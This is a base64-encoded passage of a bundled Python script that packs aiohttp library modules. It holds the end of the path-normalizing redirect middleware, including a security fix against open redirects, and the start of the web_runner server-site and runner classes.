CBvZiBhIHJlcXVlc3QuXHJcblxyXG4gICAgTm9ybWFsaXppbmcgbWVhbnM6XHJcbiAgICAgICAgLSBBZGQgb3IgcmVtb3ZlIGEgdHJhaWxpbmcgc2xhc2ggdG8gdGhlIHBhdGguXHJcbiAgICAgICAgLSBEb3VibGUgc2xhc2hlcyBhcmUgcmVwbGFjZWQgYnkgb25lLlxyXG5cclxuICAgIFRoZSBtaWRkbGV3YXJlIHJldHVybnMgYXMgc29vbiBhcyBpdCBmaW5kcyBhIHBhdGggdGhhdCByZXNvbHZlc1xyXG4gICAgY29ycmVjdGx5LiBUaGUgb3JkZXIgaWYgYm90aCBtZXJnZSBhbmQgYXBwZW5kL3JlbW92ZSBhcmUgZW5hYmxlZCBpc1xyXG4gICAgICAgIDEpIG1lcmdlIHNsYXNoZXNcclxuICAgICAgICAyKSBhcHBlbmQvcmVtb3ZlIHNsYXNoXHJcbiAgICAgICAgMykgYm90aCBtZXJnZSBzbGFzaGVzIGFuZCBhcHBlbmQvcmVtb3ZlIHNsYXNoLlxyXG4gICAgSWYgdGhlIHBhdGggcmVzb2x2ZXMgd2l0aCBhdCBsZWFzdCBvbmUgb2YgdGhvc2UgY29uZGl0aW9ucywgaXQgd2lsbFxyXG4gICAgcmVkaXJlY3QgdG8gdGhlIG5ldyBwYXRoLlxyXG5cclxuICAgIE9ubHkgb25lIG9mIGBhcHBlbmRfc2xhc2hgIGFuZCBgcmVtb3ZlX3NsYXNoYCBjYW4gYmUgZW5hYmxlZC4gSWYgYm90aFxyXG4gICAgYXJlIGBUcnVlYCB0aGUgZmFjdG9yeSB3aWxsIHJhaXNlIGFuIGFzc2VydGlvbiBlcnJvclxyXG5cclxuICAgIElmIGBhcHBlbmRfc2xhc2hgIGlzIGBUcnVlYCB0aGUgbWlkZGxld2FyZSB3aWxsIGFwcGVuZCBhIHNsYXNoIHdoZW5cclxuICAgIG5lZWRlZC4gSWYgYSByZXNvdXJjZSBpcyBkZWZpbmVkIHdpdGggdHJhaWxpbmcgc2xhc2ggYW5kIHRoZSByZXF1ZXN0XHJcbiAgICBjb21lcyB3aXRob3V0IGl0LCBpdCB3aWxsIGFwcGVuZCBpdCBhdXRvbWF0aWNhbGx5LlxyXG5cclxuICAgIElmIGByZW1vdmVfc2xhc2hgIGlzIGBUcnVlYCwgYGFwcGVuZF9zbGFzaGAgbXVzdCBiZSBgRmFsc2VgLiBXaGVuIGVuYWJsZWRcclxuICAgIHRoZSBtaWRkbGV3YXJlIHdpbGwgcmVtb3ZlIHRyYWlsaW5nIHNsYXNoZXMgYW5kIHJlZGlyZWN0IGlmIHRoZSByZXNvdXJjZVxyXG4gICAgaXMgZGVmaW5lZFxyXG5cclxuICAgIElmIG1lcmdlX3NsYXNoZXMgaXMgVHJ1ZSwgbWVyZ2UgbXVsdGlwbGUgY29uc2VjdXRpdmUgc2xhc2hlcyBpbiB0aGVcclxuICAgIHBhdGggaW50byBvbmUuXHJcbiAgICAiIiJcclxuICAgIGNvcnJlY3RfY29uZmlndXJhdGlvbiA9IG5vdCAoYXBwZW5kX3NsYXNoIGFuZCByZW1vdmVfc2xhc2gpXHJcbiAgICBhc3NlcnQgY29ycmVjdF9jb25maWd1cmF0aW9uLCAiQ2Fubm90IGJvdGggcmVtb3ZlIGFuZCBhcHBlbmQgc2xhc2giXHJcblxyXG4gICAgQG1pZGRsZXdhcmVcclxuICAgIGFzeW5jIGRlZiBpbXBsKHJlcXVlc3Q6IFJlcXVlc3QsIGhhbmRsZXI6IEhhbmRsZXIpIC0+IFN0cmVhbVJlc3BvbnNlOlxyXG4gICAgICAgIGlmIGlzaW5zdGFuY2UocmVxdWVzdC5tYXRjaF9pbmZvLnJvdXRlLCBTeXN0ZW1Sb3V0ZSk6XHJcbiAgICAgICAgICAgIHBhdGhzX3RvX2NoZWNrID0gW11cclxuICAgICAgICAgICAgaWYgIj8iIGluIHJlcXVlc3QucmF3X3BhdGg6XHJcbiAgICAgICAgICAgICAgICBwYXRoLCBxdWVyeSA9IHJlcXVlc3QucmF3X3BhdGguc3BsaXQoIj8iLCAxKVxyXG4gICAgICAgICAgICAgICAgcXVlcnkgPSAiPyIgKyBxdWVyeVxyXG4gICAgICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICAgICAgcXVlcnkgPSAiIlxyXG4gICAgICAgICAgICAgICAgcGF0aCA9IHJlcXVlc3QucmF3X3BhdGhcclxuXHJcbiAgICAgICAgICAgIGlmIG1lcmdlX3NsYXNoZXM6XHJcbiAgICAgICAgICAgICAgICBwYXRoc190b19jaGVjay5hcHBlbmQocmUuc3ViKCIvLysiLCAiLyIsIHBhdGgpKVxyXG4gICAgICAgICAgICBpZiBhcHBlbmRfc2xhc2ggYW5kIG5vdCByZXF1ZXN0LnBhdGguZW5kc3dpdGgoIi8iKTpcclxuICAgICAgICAgICAgICAgIHBhdGhzX3RvX2NoZWNrLmFwcGVuZChwYXRoICsgIi8iKVxyXG4gICAgICAgICAgICBpZiByZW1vdmVfc2xhc2ggYW5kIHJlcXVlc3QucGF0aC5lbmRzd2l0aCgiLyIpOlxyXG4gICAgICAgICAgICAgICAgcGF0aHNfdG9fY2hlY2suYXBwZW5kKHBhdGhbOi0xXSlcclxuICAgICAgICAgICAgaWYgbWVyZ2Vfc2xhc2hlcyBhbmQgYXBwZW5kX3NsYXNoOlxyXG4gICAgICAgICAgICAgICAgcGF0aHNfdG9fY2hlY2suYXBwZW5kKHJlLnN1YigiLy8rIiwgIi8iLCBwYXRoICsgIi8iKSlcclxuICAgICAgICAgICAgaWYgbWVyZ2Vfc2xhc2hlcyBhbmQgcmVtb3ZlX3NsYXNoOlxyXG4gICAgICAgICAgICAgICAgbWVyZ2VkX3NsYXNoZXMgPSByZS5zdWIoIi8vKyIsICIvIiwgcGF0aClcclxuICAgICAgICAgICAgICAgIHBhdGhzX3RvX2NoZWNrLmFwcGVuZChtZXJnZWRfc2xhc2hlc1s6LTFdKVxyXG5cclxuICAgICAgICAgICAgZm9yIHBhdGggaW4gcGF0aHNfdG9fY2hlY2s6XHJcbiAgICAgICAgICAgICAgICBwYXRoID0gcmUuc3ViKCJeLy8rIiwgIi8iLCBwYXRoKSAgIyBTRUNVUklUWTogR0hTQS12NndwLTRtNmYtZ2NqZ1xyXG4gICAgICAgICAgICAgICAgcmVzb2x2ZXMsIHJlcXVlc3QgPSBhd2FpdCBfY2hlY2tfcmVxdWVzdF9yZXNvbHZlcyhyZXF1ZXN0LCBwYXRoKVxyXG4gICAgICAgICAgICAgICAgaWYgcmVzb2x2ZXM6XHJcbiAgICAgICAgICAgICAgICAgICAgcmFpc2UgcmVkaXJlY3RfY2xhc3MocmVxdWVzdC5yYXdfcGF0aCArIHF1ZXJ5KVxyXG5cclxuICAgICAgICByZXR1cm4gYXdhaXQgaGFuZGxlcihyZXF1ZXN0KVxyXG5cclxuICAgIHJldHVybiBpbXBsXHJcblxyXG5cclxuZGVmIF9maXhfcmVxdWVzdF9jdXJyZW50X2FwcChhcHA6ICJBcHBsaWNhdGlvbiIpIC0+IF9NaWRkbGV3YXJlOlxyXG4gICAgQG1pZGRsZXdhcmVcclxuICAgIGFzeW5jIGRlZiBpbXBsKHJlcXVlc3Q6IFJlcXVlc3QsIGhhbmRsZXI6IEhhbmRsZXIpIC0+IFN0cmVhbVJlc3BvbnNlOlxyXG4gICAgICAgIHdpdGggcmVxdWVzdC5tYXRjaF9pbmZvLnNldF9jdXJyZW50X2FwcChhcHApOlxyXG4gICAgICAgICAgICByZXR1cm4gYXdhaXQgaGFuZGxlcihyZXF1ZXN0KVxyXG5cclxuICAgIHJldHVybiBpbXBsXHJcbicpCiAgICBfX3N0aWNreXRhcGVfd3JpdGVfbW9kdWxlKCdhaW9odHRwL3dlYl9ydW5uZXIucHknLCBiJ2ltcG9ydCBhc3luY2lvXHJcbmltcG9ydCBzaWduYWxcclxuaW1wb3J0IHNvY2tldFxyXG5mcm9tIGFiYyBpbXBvcnQgQUJDLCBhYnN0cmFjdG1ldGhvZFxyXG5mcm9tIHR5cGluZyBpbXBvcnQgQW55LCBMaXN0LCBPcHRpb25hbCwgU2V0XHJcblxyXG5mcm9tIHlhcmwgaW1wb3J0IFVSTFxyXG5cclxuZnJvbSAud2ViX2FwcCBpbXBvcnQgQXBwbGljYXRpb25cclxuZnJvbSAud2ViX3NlcnZlciBpbXBvcnQgU2VydmVyXHJcblxyXG50cnk6XHJcbiAgICBmcm9tIHNzbCBpbXBvcnQgU1NMQ29udGV4dFxyXG5leGNlcHQgSW1wb3J0RXJyb3I6XHJcbiAgICBTU0xDb250ZXh0ID0gb2JqZWN0ICAjIHR5cGU6IGlnbm9yZVttaXNjLGFzc2lnbm1lbnRdXHJcblxyXG5cclxuX19hbGxfXyA9IChcclxuICAgICJCYXNlU2l0ZSIsXHJcbiAgICAiVENQU2l0ZSIsXHJcbiAgICAiVW5peFNpdGUiLFxyXG4gICAgIk5hbWVkUGlwZVNpdGUiLFxyXG4gICAgIlNvY2tTaXRlIixcclxuICAgICJCYXNlUnVubmVyIixcclxuICAgICJBcHBSdW5uZXIiLFxyXG4gICAgIlNlcnZlclJ1bm5lciIsXHJcbiAgICAiR3JhY2VmdWxFeGl0IixcclxuKVxyXG5cclxuXHJcbmNsYXNzIEdyYWNlZnVsRXhpdChTeXN0ZW1FeGl0KTpcclxuICAgIGNvZGUgPSAxXHJcblxyXG5cclxuZGVmIF9yYWlzZV9ncmFjZWZ1bF9leGl0KCkgLT4gTm9uZTpcclxuICAgIHJhaXNlIEdyYWNlZnVsRXhpdCgpXHJcblxyXG5cclxuY2xhc3MgQmFzZVNpdGUoQUJDKTpcclxuICAgIF9fc2xvdHNfXyA9ICgiX3J1bm5lciIsICJfc2h1dGRvd25fdGltZW91dCIsICJfc3NsX2NvbnRleHQiLCAiX2JhY2tsb2ciLCAiX3NlcnZlciIpXHJcblxyXG4gICAgZGVmIF9faW5pdF9fKFxyXG4gICAgICAgIHNlbGYsXHJcbiAgICAgICAgcnVubmVyOiAiQmFzZVJ1bm5lciIsXHJcbiAgICAgICAgKixcclxuICAgICAgICBzaHV0ZG93bl90aW1lb3V0OiBmbG9hdCA9IDYwLjAsXHJcbiAgICAgICAgc3NsX2NvbnRleHQ6IE9wdGlvbmFsW1NTTENvbnRleHRdID0gTm9uZSxcclxuICAgICAgICBiYWNrbG9nOiBpbnQgPSAxMjgsXHJcbiAgICApIC0+IE5vbmU6XHJcbiAgICAgICAgaWYgcnVubmVyLnNlcnZlciBpcyBOb25lOlxyXG4gICAgICAgICAgICByYWlzZSBSdW50aW1lRXJyb3IoIkNhbGwgcnVubmVyLnNldHVwKCkgYmVmb3JlIG1ha2luZyBhIHNpdGUiKVxyXG4gICAgICAgIHNlbGYuX3J1bm5lciA9IHJ1bm5lclxyXG4gICAgICAgIHNlbGYuX3NodXRkb3duX3RpbWVvdXQgPSBzaHV0ZG93bl90aW1lb3V0XHJcbiAgICAgICAgc2VsZi5fc3NsX2NvbnRleHQgPSBzc2xfY29udGV4dFxyXG4gICAgICAgIHNlbGYuX2JhY2tsb2cgPSBiYWNrbG9nXHJcbiAgICAgICAgc2VsZi5fc2VydmVyID0gTm9uZSAgIyB0eXBlOiBPcHRpb25hbFthc3luY2lvLkFic3RyYWN0U2VydmVyXVxyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgQGFic3RyYWN0bWV0aG9kXHJcbiAgICBkZWYgbmFtZShzZWxmKSAtPiBzdHI6XHJcbiAgICAgICAgcGFzcyAgIyBwcmFnbWE6IG5vIGNvdmVyXHJcblxyXG4gICAgQGFic3RyYWN0bWV0aG9kXHJcbiAgICBhc3luYyBkZWYgc3RhcnQoc2VsZikgLT4gTm9uZTpcclxuICAgICAgICBzZWxmLl9ydW5uZXIuX3JlZ19zaXRlKHNlbGYpXHJcblxyXG4gICAgYXN5bmMgZGVmIHN0b3Aoc2VsZikgLT4gTm9uZTpcclxuICAgICAgICBzZWxmLl9ydW5uZXIuX2NoZWNrX3NpdGUoc2VsZilcclxuICAgICAgICBpZiBzZWxmLl9zZXJ2ZXIgaXMgTm9uZTpcclxuICAgICAgICAgICAgc2VsZi5fcnVubmVyLl91bnJlZ19zaXRlKHNlbGYpXHJcbiAgICAgICAgICAgIHJldHVybiAgIyBub3Qgc3RhcnRlZCB5ZXRcclxuICAgICAgICBzZWxmLl9zZXJ2ZXIuY2xvc2UoKVxyXG4gICAgICAgICMgbmFtZWQgcGlwZXMgZG8gbm90IGhhdmUgd2FpdF9jbG9zZWQgcHJvcGVydHlcclxuICAgICAgICBpZiBoYXNhdHRyKHNlbGYuX3NlcnZlciwgIndhaXRfY2xvc2VkIik6XHJcbiAgICAgICAgICAgIGF3YWl0IHNlbGYuX3NlcnZlci53YWl0X2Nsb3NlZCgpXHJcbiAgICAgICAgYXdhaXQgc2VsZi5fcnVubmVyLnNodXRkb3duKClcclxuICAgICAgICBhc3NlcnQgc2VsZi5fcnVubmVyLnNlcnZlclxyXG4gICAgICAgIGF3YWl0IHNlbGYuX3J1bm5lci5zZXJ2ZXIuc2h1dGRvd24oc2VsZi5fc2h1dGRvd25fdGltZW91dClcclxuICAgICAgICBzZWxmLl9ydW5uZXIuX3VucmVnX3NpdGUoc2VsZilcclxuXHJcblxyXG5jbGFzcyBUQ1BTaXRlKEJhc2VTaXRlKTpcclxuICAgIF9fc2xvdHNfXyA9ICgiX2hvc3QiLCAiX3BvcnQiLCAiX3JldXNlX2FkZHJlc3MiLCAiX3JldXNlX3BvcnQiKVxyXG5cclxuICAgIGRlZiBfX2luaXRfXyhcclxuICAgICAgICBzZWxmLFxyXG4gICAgICAgIHJ1bm5lcjogIkJhc2VSdW5uZXIiLFxyXG4gICAgICAgIGhvc3Q6IE9wdGlvbmFsW3N0cl0gPSBOb25lLFxyXG4gICAgICAgIHBvcnQ6IE9wdGlvbmFsW2ludF0gPSBOb25lLFxyXG4gICAgICAgICosXHJcbiAgICAgICAgc2h1dGRvd25fdGltZW91dDogZmxvYXQgPSA2MC4wLFxyXG4gICAgICAgIHNzbF9jb250ZXh0OiBPcHRpb25hbFtTU0xDb250ZXh0XSA9IE5vbmUsXHJcbiAgICAgICAgYmFja2xvZzogaW50ID0gMTI4LFxyXG4gICAgICAgIHJldXNlX2FkZHJlc3M6IE9wdGlvbmFsW2Jvb2xdID0gTm9uZSxcclxuICAgICAgICByZXVzZV9wb3J0OiBPcHRpb25hbFtib29sXSA9IE5vbmUsXHJcbiAgICApIC0+IE5vbmU6XHJcbiAgICAgICAgc3VwZXIoKS5fX2luaXRfXyhcclxuICAgICAgICAgICAgcnVubmVyLFxyXG4gICAgICAgICAgICBzaHV0ZG93bl90aW1lb3V0PXNodXRkb3duX3RpbWVvdXQsXHJcbiAgICAgICAgICAgIHNzbF9jb250ZXh0PXNzbF9jb250ZXh0LFxyXG4gICAgICAgICAgICBiYWNrbG9nPWJhY2tsb2csXHJcbiAgICAgICAgKVxyXG4gICAgICAgIHNlbGYuX2hvc3QgPSBob3N0XHJcbiAgICAgICAgaWYgcG9ydCBpcyBOb25lOlxyXG4gICAgICAgICAgICBwb3J0ID0gODQ0MyBpZiBzZWxmLl9zc2xfY29udGV4dCBlbHNlIDgwODBcclxuICAgICAgICBzZWxmLl9wb3J0ID0gcG9ydFxyXG4gICAgICAgIHNlbGYuX3JldXNlX2FkZHJlc3MgPSByZXVzZV9hZGRyZXNzXHJcbiAgICAgICAgc2VsZi5fcmV1c2VfcG9ydCA9IHJldXNlX3BvcnRcclxuXHJcbiAgICBAcHJvcGVydHlcclxuICAgIGRlZiBuYW1lKHNlbGYpIC0+IHN0cjpcclxuICAgICAgICBzY2hlbWUgPSAiaHR0cHMiIGlmIHNlbGYuX3NzbF9jb250ZXh0IGVsc2UgImh0dHAiXHJcbiAgICAgICAgaG9zdCA9ICIwLjAuMC4wIiBpZiBzZWxmLl9ob3N0IGlzIE5vbmUgZWxzZSBzZWxmLl9ob3N0XHJcbiAgICAgICAgcmV0dXJuIHN0cihVUkwuYnVpbGQoc2NoZW1lPXNjaGVtZSwgaG9zdD1ob3N0LCBwb3J0PXNlbGYuX3BvcnQpKVxyXG5cclxuICAgIGFzeW5jIGRlZiBzdGFydChzZWxmKSAtPiBOb25lOlxyXG4gICAgICAgIGF3YWl0IHN1cGVyKCkuc3RhcnQoKVxyXG4gICAgICAgIGxvb3AgPSBhc3luY2lvLmdldF9ldmVudF9sb29wKClcclxuICAgICAgICBzZXJ2ZXIgPSBzZWxmLl9ydW5uZXIuc2VydmVyXHJcbiAgICAgICAgYXNzZXJ0IHNlcnZlciBpcyBub3QgTm9uZVxyXG4gICAgICAgIHNlbGYuX3NlcnZlciA9IGF3YWl0IGxvb3AuY3JlYXRlX3NlcnZlcihcclxuICAgICAgICAgICAgc2VydmVyLFxyXG4gICAgICAgICAgICBzZWxmLl9ob3N0LFxyXG4gICAgICAgICAgICBzZWxmLl9wb3J0LFxyXG4gICAgICAgICAgICBzc2w9c2VsZi5fc3NsX2NvbnRleHQsXHJcbiAgICAgICAgICAgIGJhY2tsb2c9c2VsZi5fYmFja2xvZyxcclxuICAgICAgICAgICAgcmV1c2VfYWRkcmVzcz1zZWxmLl9yZXVzZV9hZGRyZXNzLFxyXG4gICAgICAgICAgICByZXVzZV9wb3J0PXNlbGYuX3JldXNlX3BvcnQsXHJcbiAgICAgICAgKVxyXG5cclxuXHJcbmNsYXNzIFVuaXhTaXRlKEJhc2VTaXRlKTpcclxuICAgIF9fc2xvdHNfXyA9ICgiX3BhdGgiLClcclxuXHJcbiAgICBkZWYgX19pbml0X18oXHJcbiAgICAgICAgc2VsZixcclxuICAgICAgICBydW5uZXI6ICJCYXNlUnVubmVyIixcclxuICAgICAgICBwYXRoOiBzdHIsXHJcbiAgICAgICAgKixcclxuICAgICAgICBzaHV0ZG93bl90aW1lb3V0OiBmbG9hdCA9IDYwLjAsXHJcbiAgICAgICAgc3NsX2NvbnRleHQ6IE9wdGlvbmFsW1NTTENvbnRleHRdID0gTm9uZSxcclxuICAgICAgICBiYWNrbG9nOiBpbnQgPSAxMjgsXHJcbiAgICApIC0+IE5vbmU6XHJcbiAgICAgICAgc3VwZXIoKS5fX2luaXRfXyhcclxuICAgICAgICAgICAgcnVubmVyLFxyXG4gICAgICAgICAgICBzaHV0ZG93bl90aW1lb3V0PXNodXRkb3duX3RpbWVvdXQsXHJcbiAgICAgICAgICAgIHNzbF9jb250ZXh0PXNzbF9jb250ZXh0LFxyXG4gICAgICAgICAgICBiYWNrbG9nPWJhY2tsb2csXHJcbiAgICAgICAgKVxyXG4gICAgICAgIHNlbGYuX3BhdGggPSBwYXRoXHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgbmFtZShzZWxmKSAtPiBzdHI6XHJcbiAgICAgICAgc2NoZW1lID0gImh0dHBzIiBpZiBzZWxmLl9zc2xfY29udGV4dCBlbHNlICJodHRwIlxyXG4gICAgICAgIHJldHVybiBmIntzY2hlbWV9Oi8vdW5peDp7c2VsZi5fcGF0aH06IlxyXG5cclxuICAgIGFzeW5jIGRlZiBzdGFydChzZWxmKSAtPiBOb25lOlxyXG4gICAgICAgIGF3YWl0IHN1cGVyKCkuc3RhcnQoKVxyXG4gICAgICAgIGxvb3AgPSBhc3luY2lvLmdldF9ldmVudF9sb29wKClcclxuICAgICAgICBzZXJ2ZXIgPSBzZWxmLl9ydW5uZXIuc2VydmVyXHJcbiAgICAgICAgYXNzZXJ0IHNlcnZlciBpcyBub3QgTm9uZVxyXG4gICAgICAgIHNlbGYuX3NlcnZlciA9IGF3YWl0IGxvb3AuY3JlYXRlX3VuaXhfc2VydmVyKFxyXG4gICAgICAgICAgICBzZXJ2ZXIsIHNlbGYuX3BhdGgsIHNzbD1zZWxmLl9zc2xfY29udGV4dCwgYmFja2xvZz1zZWxmLl9iYWNrbG9nXHJcbiAgICAgICAgKVxyXG5cclxuXHJcbmNsYXNzIE5hbWVkUGlwZVNpdGUoQmFzZVNpdGUpOlxyXG4gICAgX19zbG90c19fID0gKCJfcGF0aCIsKVxyXG5cclxuICAgIGRlZiBfX2luaXRfXyhcclxuICAgICAgICBzZWxmLCBydW5uZXI6ICJCYXNlUnVubmVyIiwgcGF0aDogc3RyLCAqLCBzaHV0ZG93bl90aW1lb3V0OiBmbG9hdCA9IDYwLjBcclxuICAgICkgLT4gTm9uZTpcclxuICAgICAgICBsb29wID0gYXN5bmNpby5nZXRfZXZlbnRfbG9vcCgpXHJcbiAgICAgICAgaWYgbm90IGlzaW5zdGFuY2UoXHJcbiAgICAgICAgICAgIGxvb3AsIGFzeW5jaW8uUHJvYWN0b3JFdmVudExvb3AgICMgdHlwZTogaWdub3JlW2F0dHItZGVmaW5lZF1cclxuICAgICAgICApOlxyXG4gICAgICAgICAgICByYWlzZSBSdW50aW1lRXJyb3IoXHJcbiAgICAgICAgICAgICAgICAiTmFtZWQgUGlwZXMgb25seSBhdmFpbGFibGUgaW4gcHJvYWN0b3IiICJsb29wIHVuZGVyIHdpbmRvd3MiXHJcbiAgICAgICAgICAgIClcclxuICAgICAgICBzdXBlcigpLl9faW5pdF9fKHJ1bm5lciwgc2h1dGRvd25fdGltZW91dD1zaHV0ZG93bl90aW1lb3V0KVxyXG4gICAgICAgIHNlbGYuX3BhdGggPSBwYXRoXHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgbmFtZShzZWxmKSAtPiBzdHI6XHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX3BhdGhcclxuXHJcbiAgICBhc3luYyBkZWYgc3RhcnQoc2VsZikgLT4gTm9uZTpcclxuICAgICAgICBhd2FpdCBzdXBlcigpLnN0YXJ0KClcclxuICAgICAgICBsb29wID0gYXN5bmNpby5nZXRfZXZlbnRfbG9vcCgpXHJcbiAgICAgICAgc2VydmVyID0gc2VsZi5fcnVubmVyLnNlcnZlclxyXG4gICAgICAgIGFzc2VydCBzZXJ2ZXIgaXMgbm90IE5vbmVcclxuICAgICAgICBfc2VydmVyID0gYXdhaXQgbG9vcC5zdGFydF9zZXJ2aW5nX3BpcGUoICAjIHR5cGU6IGlnbm9yZVthdHRyLWRlZmluZWRdXHJcbiAgICAgICAgICAgIHNlcnZlciwgc2VsZi5fcGF0aFxyXG4gICAgICAgIClcclxuICAgICAgICBzZWxmLl9zZXJ2ZXIgPSBfc2VydmVyWzBdXHJcblxyXG5cclxuY2xhc3MgU29ja1NpdGUoQmFzZVNpdGUpOlxyXG4gICAgX19zbG90c19fID0gKCJfc29jayIsICJfbmFtZSIpXHJcblxyXG4gICAgZGVmIF9faW5pdF9fKFxyXG4gICAgICAgIHNlbGYsXHJcbiAgICAgICAgcnVubmVyOiAiQmFzZVJ1bm5lciIsXHJcbiAgICAgICAgc29jazogc29ja2V0LnNvY2tldCxcclxuICAgICAgICAqLFxyXG4gICAgICAgIHNodXRkb3duX3RpbWVvdXQ6IGZsb2F0ID0gNjAuMCxcclxuICAgICAgICBzc2xfY29udGV4dDogT3B0aW9uYWxbU1NMQ29udGV4dF0gPSBOb25lLFxyXG4gICAgICAgIGJhY2tsb2c6IGludCA9IDEyOCxcclxuICAgICkgLT4gTm9uZTpcclxuICAgICAgICBzdXBlcigpLl9faW5pdF9fKFxyXG4gICAgICAgICAgICBydW5uZXIsXHJcbiAgICAgICAgICAgIHNodXRkb3duX3RpbWVvdXQ9c2h1dGRvd25fdGltZW91dCxcclxuICAgICAgICAgICAgc3NsX2NvbnRleHQ9c3NsX2NvbnRleHQsXHJcbiAgICAgICAgICAgIGJhY2tsb2c9YmFja2xvZyxcclxuICAgICAgICApXHJcbiAgICAgICAgc2VsZi5fc29jayA9IHNvY2tcclxuICAgICAgICBzY2hlbWUgPSAiaHR0cHMiIGlmIHNlbGYuX3NzbF9jb250ZXh0IGVsc2UgImh0dHAiXHJcbiAgICAgICAgaWYgaGFzYXR0cihzb2NrZXQsICJBRl9VTklYIikgYW5kIHNvY2suZmFtaWx5ID09IHNvY2tldC5BRl9VTklYOlxyXG4gICAgICAgICAgICBuYW1lID0gZiJ7c2NoZW1lfTovL3VuaXg6e3NvY2suZ2V0c29ja25hbWUoKX06IlxyXG4gICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgIGhvc3QsIHBvcnQgPSBzb2NrLmdldHNvY2tuYW1lKClbOjJdXHJcbiAgICAgICAgICAgIG5hbWUgPSBzdHIoVVJMLmJ1aWxkKHNjaGVtZT1zY2hlbWUsIGhvc3Q9aG9zdCwgcG9ydD1wb3J0KSlcclxuICAgICAgICBzZWxmLl9uYW1lID0gbmFtZVxyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgZGVmIG5hbWUoc2VsZikgLT4gc3RyOlxyXG4gICAgICAgIHJldHVybiBzZWxmLl9uYW1lXHJcblxyXG4gICAgYXN5bmMgZGVmIHN0YXJ0KHNlbGYpIC0+IE5vbmU6XHJcbiAgICAgICAgYXdhaXQgc3VwZXIoKS5zdGFydCgpXHJcbiAgICAgICAgbG9vcCA9IGFzeW5jaW8uZ2V0X2V2ZW50X2xvb3AoKVxyXG4gICAgICAgIHNlcnZlciA9IHNlbGYuX3J1bm5lci5zZXJ2ZXJcclxuICAgICAgICBhc3NlcnQgc2VydmVyIGlzIG5vdCBOb25lXHJcbiAgICAgICAgc2VsZi5fc2VydmVyID0gYXdhaXQgbG9vcC5jcmVhdGVfc2VydmVyKFxyXG4gICAgICAgICAgICBzZXJ2ZXIsIHNvY2s9c2VsZi5fc29jaywgc3NsPXNlbGYuX3NzbF9jb250ZXh0LCBiYWNrbG9nPXNlbGYuX2JhY2tsb2dcclxuICAgICAgICApXHJcblxyXG5cclxuY2xhc3MgQmFzZVJ1bm5lcihBQkMpOlxyXG4gICAgX19zbG90c19fID0gKCJfaGFuZGxlX3NpZ25hbHMiLCAiX2t3YXJncyIsICJfc2VydmVyIiwgIl9zaXRlcyIpXHJcblxyXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsICosIGhhbmRsZV9zaWduYWxzOiBib29sID0gRmFsc2UsICoqa3dhcmdzOiBBbnkpIC0+IE5vbmU6XHJcbiAgICAgICAgc2VsZi5faGFuZGxlX3NpZ25hbHMgPSBoYW5kbGVfc2lnbmFsc1xyXG4gICAgICAgIHNlbGYuX2t3YXJncyA9IGt3YXJnc1xyXG4gICAgICAgIHNlbGYuX3NlcnZlciA9IE5vbmUgICMgdHlwZTogT3B0aW9uYWxbU2VydmVyXVxyXG4gICAgICAgIHNlbGYuX3NpdGVzID0gW10gICMgdHlwZTogTGlzdFtCYXNlU2l0ZV1cclxuXHJcbiAgICBAcHJvcGVydHlcclxuICAgIGRlZiBzZXJ2ZXIoc2VsZikgLT4gT3B0aW9uYWxbU2VydmVyXTpcclxuICAgICAgICByZXR1cm4gc2VsZi5fc2VydmVyXHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgYWRkcmVzc2VzKHNlbGYpIC0+IExpc3RbQW55XTpcclxuICAgICAgICByZXQgPSBbXSAgIyB0eXBlOiBMaXN0W0FueV1cclxuICAgICAgICBmb3Igc2l0ZSBpbiBzZWxmLl9zaXRlczpcclxuICAgICAgICAgICAgc2VydmVyID0gc2l0ZS5fc2VydmVyXHJcbiAgICAgICAgICAgIGlmIHNlcnZlciBpcyBub3QgTm9uZTpcclxuICAgICAgICAgICAgICAgIHNvY2tldHMgPSBzZXJ2ZXIuc29ja2V0c1xyXG4gICAgICAgICAgICAgICAgaWYgc29ja2V0cyBpcyBub3QgTm9uZTpcclxuICAgICAgICAgICAgICAgICAgICBmb3Igc29jayBpbiBzb2NrZXRzOlxyXG4gICAgICAgICAgICAgICAgICAgICAgICByZXQuYXBwZW5kKHNvY2suZ2V0c29ja25hbWUoKSlcclxuICAgICAgICByZXR1cm4gcmV0XHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgc2l0ZXMoc2VsZikgLT4gU2V0W0Jhc2VTaXRlXTpcclxuICAgICAgICByZXR1cm4gc2V0KHNlbGYuX3NpdGVzKVxyXG5cclxuICAgIGFzeW5jIGRlZiBzZXR1cChzZWxmKSAtPiBOb25lOlxyXG4gICAgICAgIGxvb3AgPSBhc3luY2lvLmdldF9ldmVudF9sb29wKClcclxuXHJcbiAgICAgICAgaWYgc2VsZi5faGFuZGxlX3NpZ25hbHM6XHJcbiAgICAgICAgICAgIHRyeTpcclxuICAgICAgICAgICAgICAgIGxvb3AuYWRkX3NpZ25hbF9oYW5kbGVyKHNpZ25hbC5TSUdJTlQsIF9yYWlzZV9ncmFjZWZ1bF9leGl0KVxyXG4gICAgICAgICAgICAgICAgbG9vcC5hZGRfc2lnbmFsX2hhbmRsZXIoc2lnbmFsLlNJR1RFUk0sIF9yYWlzZV9ncmFjZWZ1bF9leGl0KVxyXG4gICAgICAgICAgICBleGNlcHQgTm90SW1wbGVtZW50ZWRFcnJvcjogICMgcHJhZ21hOiBubyBjb3ZlclxyXG4gICAgICAgICAgICAgICAgIyBhZGRfc2lnbmFsX2hhbmRsZXIgaXMgbm90IGltcGxlbWVudGVkIG9uIFdpbmRvd3NcclxuICAgICAgICAgICAgICAgIHBhc3NcclxuXHJcbiAgICAgICAgc2VsZi5fc2VydmVyID0gYXdhaXQgc2VsZi5fbWFrZV9zZXJ2ZXIoKVxyXG5cclxuICAgIEBhYnN0cmFjdG1ldGhvZFxyXG4gICAgYXN5bmMgZGVmIHNodXRkb3duKHNlbGYpIC0+IE5vbmU6XHJcbiAgICAgICAgcGFzcyAgIyBwcmFnbWE6IG5vIGNvdmVyXHJcblxyXG4gICAgYXN5bmMgZGVmIGNsZWFudXAoc2VsZikgLT4gTm9uZTpcclxuICAgICAgICBsb29wI